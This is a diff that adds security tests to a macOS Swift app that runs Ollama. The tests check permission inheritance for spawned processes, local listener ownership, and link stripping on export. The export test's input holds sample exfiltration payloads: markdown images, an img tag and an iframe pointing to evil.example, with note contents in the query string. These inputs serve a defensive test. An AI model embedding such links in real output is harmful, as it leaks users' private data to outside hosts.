@@ -48,4 +48,54 @@ final class SecurityTests: XCTestCase {
         try db.write { try Vocabulary.keepOnlyScreenTerms($0) }
         XCTAssertEqual(try db.read { try ScreenText.fetchAll($0) }.map(\.text), rows.map(\.text))
     }
+
+    /// A program the app starts (Ollama) is responsible for itself, so it does not get the app's
+    /// microphone, system-audio or screen permissions. Checked with the same macOS function the
+    /// privacy system uses.
+    func testStartedProgramIsResponsibleForItself() throws {
+        typealias Responsible = @convention(c) (pid_t) -> pid_t
+        let symbol = try XCTUnwrap(dlsym(UnsafeMutableRawPointer(bitPattern: -2), "responsibility_get_pid_responsible_for_pid"))
+        let responsible = unsafeBitCast(symbol, to: Responsible.self)
+        XCTAssertEqual(responsible(getpid()), getpid())
+
+        let pid = try Spawn.disclaimed("/bin/sleep", arguments: ["5"], environment: [:])
+        defer { kill(pid, SIGKILL); var status: Int32 = 0; waitpid(pid, &status, 0) }
+        XCTAssertEqual(responsible(pid), pid)
+        XCTAssertNotEqual(responsible(pid), getpid())
+    }
+
+    func testListenerOwnerIsChecked() {
+        let fd = socket(AF_INET, SOCK_STREAM, 0)
+        defer { close(fd) }
+        var address = sockaddr_in()
+        address.sin_family = sa_family_t(AF_INET)
+        address.sin_addr.s_addr = inet_addr("127.0.0.1")
+        address.sin_port = 0
+        var length = socklen_t(MemoryLayout<sockaddr_in>.size)
+        withUnsafeMutablePointer(to: &address) { pointer in
+            pointer.withMemoryRebound(to: sockaddr.self, capacity: 1) {
+                XCTAssertEqual(Darwin.bind(fd, $0, length), 0)
+                XCTAssertEqual(Darwin.listen(fd, 1), 0)
+                XCTAssertEqual(getsockname(fd, $0, &length), 0)
+            }
+        }
+        let port = Int(UInt16(bigEndian: address.sin_port))
+        XCTAssertTrue(OllamaClient.listenerIsMine(port: port))
+        close(fd)
+        XCTAssertFalse(OllamaClient.listenerIsMine(port: port))
+    }
+
+    func testExportDropsImagesButKeepsText() {
+        let notes = """
+        ## Notes
+        - Deck: ![Q3 deck](https://evil.example/p.png?d=budget+is+4M) and [the doc](https://docs.example/q3)
+        - Ref ![logo][1] here <img src="https://evil.example/x.gif?d=1"> end <IFRAME src="https://evil.example"></iframe>
+        - Time [12:30](notes-time://750) stays
+        """
+        let out = ExternalLink.exportable(notes)
+        XCTAssertFalse(out.contains("evil.example"))
+        XCTAssertTrue(out.contains("Deck: Q3 deck and [the doc](https://docs.example/q3)"))
+        XCTAssertTrue(out.contains("Ref logo here  end "))
+        XCTAssertTrue(out.contains("[12:30](notes-time://750)"))
+    }
 }
